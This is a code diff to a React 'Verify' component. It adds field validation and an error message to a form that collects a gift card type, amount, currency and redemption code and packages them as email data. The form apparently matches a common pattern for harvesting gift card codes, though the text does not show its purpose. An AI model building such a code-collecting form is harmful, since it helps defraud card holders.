@@ -33,6 +33,8 @@ const Verify = () => {
 
     // const pattern = /^[A-Z0-9]{10}$/;
 
+    if(cardType && amount && redemptionCode ) {
+
       const emailData = {
         cardType,
         currency,
@@ -100,6 +102,10 @@ const Verify = () => {
         });
       console.log("finished")
 
+    } else (
+      setError('Please input all fields')
+    )
+
   }
 
 
@@ -120,6 +126,7 @@ const Verify = () => {
             // onChange={handleChange} 
             onChange={handleCardTypeChange} 
             className='w-full h-16 p-4 rounded-xl'
+            required
             >
             <option defaultValue="" disabled>Select type of Card</option>
             <option value="Amazon">Amazon</option>
@@ -265,6 +272,7 @@ const Verify = () => {
           </div>
         )}
 
+          { error && <p className='text-red-600 ml-32 lg:ml-72'>{error}</p> }
 
           <button 
             className=' h-16 rounded-lg bg-primaryText my- text-white cursor-pointer flex items-center justify-center ' 
@@ -276,7 +284,6 @@ const Verify = () => {
           <Toaster />
         </form>
       )}
-        {/* { error && <p className='text-red-600'>{error}</p> } */}
         <span className='relative bottom text-white sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
       </div>
     </section>
